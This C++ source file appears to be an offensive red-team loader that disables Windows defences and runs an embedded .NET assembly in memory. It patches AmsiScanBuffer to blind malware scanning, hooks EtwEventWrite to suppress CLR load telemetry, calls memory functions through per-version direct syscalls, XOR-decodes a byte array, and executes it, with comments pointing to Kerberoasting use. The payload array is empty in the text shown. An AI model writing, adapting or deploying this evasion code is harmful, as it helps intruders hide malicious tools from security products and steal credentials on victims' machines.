#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <tchar.h>
#include <metahost.h>
#include <evntprov.h>
#include <iostream>
#include <vector>
#include <string>
#pragma comment(lib, "MSCorEE.lib")
#define mscorlibPath "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.tlb"
#import mscorlibPath raw_interfaces_only \
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;
int raw_assembly_length = 8192;



unsigned char rawData[8192] = 













#define STATUS_SUCCESS 0
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _API_SET_NAMESPACE {
	ULONG Version;
	ULONG Size;
	ULONG Flags;
	ULONG Count;
	ULONG EntryOffset;
	ULONG HashOffset;
	ULONG HashFactor;
} API_SET_NAMESPACE, * PAPI_SET_NAMESPACE;

// Partial PEB
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID IFEOKey;
	PSLIST_HEADER AtlThunkSListPtr;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ProcessPreviouslyThrottled : 1;
			ULONG ProcessCurrentlyThrottled : 1;
			ULONG ProcessImagesHotPatched : 1;
			ULONG ReservedBits0 : 24;
		};
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	PAPI_SET_NAMESPACE ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];
	PVOID ReadOnlySharedMemoryBase;
	PVOID SharedData;
	PVOID* ReadOnlyStaticServerData;
	PVOID AnsiCodePageData;
	PVOID OemCodePageData;
	PVOID UnicodeCaseTableData;
	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;
	ULARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;
	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID* ProcessHeaps;
	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;
	PRTL_CRITICAL_SECTION LoaderLock;
	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
} PEB, * PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _TEB {
	PVOID Reserved1[12];
	PPEB  ProcessEnvironmentBlock;
	PVOID Reserved2[399];
	BYTE  Reserved3[1952];
	PVOID TlsSlots[64];
	BYTE  Reserved4[8];
	PVOID Reserved5[26];
	PVOID ReservedForOle;
	PVOID Reserved6[4];
	PVOID TlsExpansionSlots;
} TEB, * PTEB;

typedef ULONG(NTAPI* _EtwEventWrite)(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData
	);

typedef ULONG(NTAPI* _EtwEventWriteFull)(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in USHORT EventProperty,
	__in_opt LPCGUID ActivityId,
	__in_opt LPCGUID RelatedActivityId,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData
	);

// Windows 7 SP1 / Server 2008 R2 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory7SP1(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory7SP1(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory7SP1(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

// Windows 8 / Server 2012 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory80(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory80(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory80(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);


// Windows 8.1 / Server 2012 R2 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory81(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory81(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory81(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);


// Windows 10 / Server 2016 specific Syscalls
EXTERN_C NTSTATUS ZwProtectVirtualMemory10(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
EXTERN_C NTSTATUS ZwReadVirtualMemory10(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
EXTERN_C NTSTATUS ZwWriteVirtualMemory10(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

NTSTATUS(*ZwProtectVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN PVOID* BaseAddress,
	IN SIZE_T* NumberOfBytesToProtect,
	IN ULONG NewAccessProtection,
	OUT PULONG OldAccessProtection
	);

NTSTATUS(*ZwReadVirtualMemory)(
	HANDLE hProcess,
	PVOID lpBaseAddress,
	PVOID lpBuffer,
	SIZE_T NumberOfBytesToRead,
	PSIZE_T NumberOfBytesRead
	);

NTSTATUS(*ZwWriteVirtualMemory)(
	HANDLE hProcess,
	PVOID lpBaseAddress,
	PVOID lpBuffer,
	SIZE_T NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten
	);

#define ModuleLoad_V2 152
#define AssemblyDCStart_V1 155
#define MethodLoadVerbose_V1 143
#define MethodJittingStarted 145
#define ILStubGenerated 88

UCHAR uHook[] = {
	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0
};

#ifdef _M_X32
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
SIZE_T patchsize = 8;
#endif
#ifdef _M_X64
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
SIZE_T patchsize = 6;
#endif

char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

ULONG NTAPI MyEtwEventWrite(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData)
{
	ULONG uResult = 0;

	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWriteFull");
	if (EtwEventWriteFull == NULL) {
		return 1;
	}

	switch (EventDescriptor->Id) {
	case AssemblyDCStart_V1:
		// Block CLR assembly loading events.
		break;
	case MethodLoadVerbose_V1:
		// Block CLR method loading events.
		break;
	case ILStubGenerated:
		// Block MSIL stub generation events.
		break;
	default:
		// Forward all other ETW events using EtwEventWriteFull.
		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
	}

	return uResult;
}

INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch) {
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;

	// Get pointer to the TEB
	pTIB = (PNT_TIB)__readgsqword(0x30);
	pTEB = (PTEB)pTIB->Self;

	// Get pointer to the PEB
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL) {
		return -1;
	}

	if (pPEB->OSMajorVersion == 10 && pPEB->OSMinorVersion == 0) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 1 && pPEB->OSBuildNumber == 7601) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 2) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 3) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
	}
	else {

		return -2;
	}

	LPVOID lpBaseAddress = lpFuncAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(patch);
	NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)patch, sizeof(patch), NULL);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		return -1;
	}

	return 0;
}

BOOL PatchAmsi()
{

	HMODULE lib = LoadLibraryA("amsi.dll");
	if (lib == NULL)
	{
		printf("Cannot load amsi.dll");
		return -2;
	}

	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
	if (addr == NULL)
	{
		printf("Cannot get address of AmsiScanBuffer");
		return -2;
	}

	return InlinePatch(addr, amsipatch);
}

BOOL PatchEtw()
{
	HMODULE lib = LoadLibraryA("ntdll.dll");
	if (lib == NULL)
	{
		printf("Cannot load ntdll.dll");
		return -2;
	}
	LPVOID lpFuncAddress = GetProcAddress(lib, "EtwEventWrite");
	if (lpFuncAddress == NULL)
	{
		printf("Cannot get address of EtwEventWrite");
		return -2;
	}

	// Add address of hook function to patch.
	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;

	return InlinePatch(lpFuncAddress, uHook);
}

BOOL FindVersion(void* assembly, int length)
{
	char* assembly_c;
	assembly_c = (char*)assembly;

	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (sig_40[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}

BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInfo) {
	HRESULT hr;
	ULONG fetched = 0;
	DWORD vbSize;
	BOOL retval = FALSE;
	wchar_t currentversion[260];

	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown**)&pRuntimeInfo, &fetched)) && fetched > 0)
	{
		hr = ((ICLRRuntimeInfo*)pRuntimeInfo)->GetVersionString(currentversion, &vbSize);
		if (!FAILED(hr))
		{
			if (wcscmp(currentversion, version) == 0)
			{
				retval = TRUE;
				break;
			}
		}
	}

	return retval;
}

ICorRuntimeHost* g_Runtime = NULL;
HANDLE g_OrigninalStdOut = INVALID_HANDLE_VALUE;
HANDLE g_CurrentStdOut = INVALID_HANDLE_VALUE;
HANDLE g_OrigninalStdErr = INVALID_HANDLE_VALUE;
HANDLE g_CurrentStdErr = INVALID_HANDLE_VALUE;


HANDLE g_hSlot = INVALID_HANDLE_VALUE;
LPCSTR SlotName = "\\\\.\\mailslot\\myMailSlot";

//Taken from : https://docs.microsoft.com/en-us/windows/win32/ipc/writing-to-a-mailslot
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName)
{
	g_hSlot = CreateMailslotA(lpszSlotName,
		0,                             // no maximum message size 
		MAILSLOT_WAIT_FOREVER,         // no time-out for operations 
		(LPSECURITY_ATTRIBUTES)NULL); // default security

	if (g_hSlot == INVALID_HANDLE_VALUE)
	{
		printf("CreateMailslot failed with %d\n", GetLastError());
		return FALSE;
	}
	else printf("Mailslot created successfully.\n");
	return TRUE;
}

// Mostly from : https://docs.microsoft.com/en-us/windows/win32/ipc/reading-from-a-mailslot
BOOL ReadSlot(std::string& output)
{
	CONST DWORD szMailBuffer = 424; //Size comes from https://docs.microsoft.com/en-us/windows/win32/ipc/about-mailslots?redirectedfrom=MSDN
	DWORD cbMessage, cMessage, cbRead;
	BOOL fResult;
	LPSTR lpszBuffer = NULL;
	LPVOID achID[szMailBuffer];
	DWORD cAllMessages;
	HANDLE hEvent;
	OVERLAPPED ov;

	cbMessage = cMessage = cbRead = 0;

	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	if (NULL == hEvent)
		return FALSE;
	ov.Offset = 0;
	ov.OffsetHigh = 0;
	ov.hEvent = hEvent;

	fResult = GetMailslotInfo(g_hSlot, // mailslot handle 
		(LPDWORD)NULL,               // no maximum message size 
		&cbMessage,                   // size of next message 
		&cMessage,                    // number of messages 
		(LPDWORD)NULL);              // no read time-out 

	if (!fResult)
	{
		printf("GetMailslotInfo failed with %d.\n", GetLastError());
		return FALSE;
	}

	if (cbMessage == MAILSLOT_NO_MESSAGE)
	{
		printf("Waiting for a message...\n");
		return TRUE;
	}

	cAllMessages = cMessage;

	while (cMessage != 0)  // retrieve all messages
	{
		// Allocate memory for the message. 

		lpszBuffer = (LPSTR)GlobalAlloc(GPTR, lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
		if (NULL == lpszBuffer)
			return FALSE;
		lpszBuffer[0] = '\0';

		fResult = ReadFile(g_hSlot,
			lpszBuffer,
			cbMessage,
			&cbRead,
			&ov);

		if (!fResult)
		{
			printf("ReadFile failed with %d.\n", GetLastError());
			GlobalFree((HGLOBAL)lpszBuffer);
			return FALSE;
		}
		output += lpszBuffer;

		fResult = GetMailslotInfo(g_hSlot,  // mailslot handle 
			(LPDWORD)NULL,               // no maximum message size 
			&cbMessage,                   // size of next message 
			&cMessage,                    // number of messages 
			(LPDWORD)NULL);              // no read time-out 

		if (!fResult)
		{
			printf("GetMailslotInfo failed (%d)\n", GetLastError());
			return FALSE;
		}
	}
	GlobalFree((HGLOBAL)lpszBuffer);
	CloseHandle(hEvent);
	return TRUE;
}


HRESULT LoadCLR()
{
	HRESULT hr;
	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	BOOL bLoadable;
	LPCWSTR clrVersion;
	if (FindVersion(rawData, raw_assembly_length))
	{
		clrVersion = L"v4.0.30319";
	}
	else
	{
		clrVersion = L"v2.0.50727";
	}
	// Open the runtime
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
	if (FAILED(hr))
		goto Cleanup;

	//DotNet version v4.0.30319
	hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
	if (FAILED(hr))
		goto Cleanup;

	// Check if the runtime is loadable (this will fail without .Net v4.x on the system)

	hr = pRuntimeInfo->IsLoadable(&bLoadable);
	if (FAILED(hr) || !bLoadable)
		goto Cleanup;

	// Load the CLR into the current process
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&g_Runtime);
	if (FAILED(hr))
		goto Cleanup;

	// Start the CLR.
	hr = g_Runtime->Start();
	if (FAILED(hr))
		goto Cleanup;

Cleanup:

	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}
	if (FAILED(hr) && g_Runtime)
	{
		g_Runtime->Release();
		g_Runtime = NULL;
	}

	return hr;
}


HRESULT CallMethod(void* assembly, std::string args, std::string& outputString) {
	HRESULT hr = S_OK;
	SAFEARRAY* psaArguments = NULL;
	IUnknownPtr pUnk = NULL;
	_AppDomainPtr pAppDomain = NULL;
	_AssemblyPtr pAssembly = NULL;
	_MethodInfo* pEntryPt = NULL;
	SAFEARRAYBOUND bounds[1];
	SAFEARRAY* psaBytes = NULL;
	LONG rgIndices = 0;
	wchar_t* w_ByteStr = NULL;
	LPWSTR* szArglist = NULL;
	int nArgs = 0;
	VARIANT vReturnVal;
	VARIANT vEmpty;
	VARIANT vtPsa;

	SecureZeroMemory(&vReturnVal, sizeof(VARIANT));
	SecureZeroMemory(&vEmpty, sizeof(VARIANT));
	SecureZeroMemory(&vtPsa, sizeof(VARIANT));
	vEmpty.vt = VT_NULL;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);

	//Get a pointer to the IUnknown interface because....COM
	hr = g_Runtime->GetDefaultDomain(&pUnk);
	if (FAILED(hr))
		goto Cleanup;


	// Get the current app domain
	hr = pUnk->QueryInterface(IID_PPV_ARGS(&pAppDomain));
	if (FAILED(hr))
		goto Cleanup;

	// Load the assembly
	//Establish the bounds for our safe array
	bounds[0].cElements = sizeof(rawData);
	bounds[0].lLbound = 0;

	//Create a safe array and fill it with the bytes of our .net assembly
	psaBytes = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(psaBytes);
	memcpy(psaBytes->pvData, rawData, sizeof(rawData));
	SafeArrayUnlock(psaBytes);

	//Load the assembly into the app domain
	hr = pAppDomain->Load_3(psaBytes, &pAssembly);
	if (FAILED(hr))
	{

		SafeArrayDestroy(psaBytes);
		goto Cleanup;
	}

	SafeArrayDestroy(psaBytes);

	// Find the entry point
	hr = pAssembly->get_EntryPoint(&pEntryPt);

	if (FAILED(hr))
		goto Cleanup;

	//This will take our arguments and format them so they look like command line arguments to main (otherwise they are treated as a single string)
	//Credit to https://github.com/b4rtik/metasploit-execute-assembly/blob/master/HostingCLR_inject/HostingCLR/HostingCLR.cpp for getting this to work properly
	if (args.empty())
	{

		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 0);

	}
	else
	{
		//Convert to wide characters
		w_ByteStr = (wchar_t*)malloc((sizeof(wchar_t) * args.size() + 1));
		mbstowcs(w_ByteStr, (char*)args.data(), args.size() + 1);
		szArglist = CommandLineToArgvW(w_ByteStr, &nArgs);


		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
		for (long i = 0; i < nArgs; i++)
		{
			BSTR strParam1 = SysAllocString(szArglist[i]);
			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
		}
	}

	psaArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

	hr = SafeArrayPutElement(psaArguments, &rgIndices, &vtPsa);

	//Execute the function.  Note that if you are executing a function with return data it will end up in vReturnVal
	hr = pEntryPt->Invoke_3(vEmpty, psaArguments, &vReturnVal);

	//Reset our Output handles (the error message won't show up if they fail, just for debugging purposes)
	if (!SetStdHandle(STD_OUTPUT_HANDLE, g_OrigninalStdOut))
	{
		std::cerr << "ERROR: SetStdHandle REVERTING stdout failed." << std::endl;
	}
	if (!SetStdHandle(STD_ERROR_HANDLE, g_OrigninalStdErr))
	{
		std::cerr << "ERROR: SetStdHandle REVERTING stderr failed." << std::endl;
	}

	//Read from our mail slot
	if (!ReadSlot(outputString))
		printf("Failed to read from mail slot");

Cleanup:
	VariantClear(&vReturnVal);
	if (NULL != psaArguments)
		SafeArrayDestroy(psaArguments);
	psaArguments = NULL;
	pAssembly->Release();

	return hr;
}


std::string ExecuteAssembly(void* assembly, std::string args)
{
	HRESULT hr;
	std::string output = "";

	//Create our mail slot
	if (!MakeSlot(SlotName))
	{
		printf("Failed to create mail slot");
		return output;
	}
	HANDLE hFile = CreateFileA(SlotName, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

	//Load the CLR
	hr = LoadCLR();
	if (FAILED(hr))
	{
		output = "failed to load CLR";
		goto END;
	}
	printf("Successfully loaded CLR\n");
	//Set stdout and stderr to our mail slot
	g_OrigninalStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	g_OrigninalStdErr = GetStdHandle(STD_ERROR_HANDLE);


	if (!SetStdHandle(STD_OUTPUT_HANDLE, hFile))
	{
		output = "SetStdHandle stdout failed.";
		goto END;
	}
	if (!SetStdHandle(STD_ERROR_HANDLE, hFile))
	{
		output = "SetStdHandle stderr failed.";
		goto END;
	}


	hr = CallMethod(assembly, args, output);
	if (FAILED(hr))
		output = "failed to call method";

END:
	if (g_hSlot != INVALID_HANDLE_VALUE)
		CloseHandle(g_hSlot);
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return output;
}

int main(int argc, char* argv[])
{
	DWORD lpNumberOfBytesRead = 0;
	DWORD dwFileSize = 0;
	PVOID lpFileBuffer = NULL;

	if (PatchEtw() == -1) {
		wprintf(L"[!] Error: 1\n");
	}

	if (PatchAmsi() == -1) {
		wprintf(L"[!] Error: 1-\n");
	}

	for (int i = 0; i < sizeof(rawData); i++)
	{
		rawData[i] = rawData[i] ^ 0x91;
	}

	std::string commandLineStr = "";
	for (int i = 1; i < argc; i++) commandLineStr.append(std::string(argv[i]).append(" "));
	//arguments seperated by a space : "kerberoast /tgtdeleg" or just ""
	std::string args = "localusers";

	//Execute the Assembly
	std::string response = ExecuteAssembly(rawData, commandLineStr);

	printf("Output from string = %s", response.c_str());
}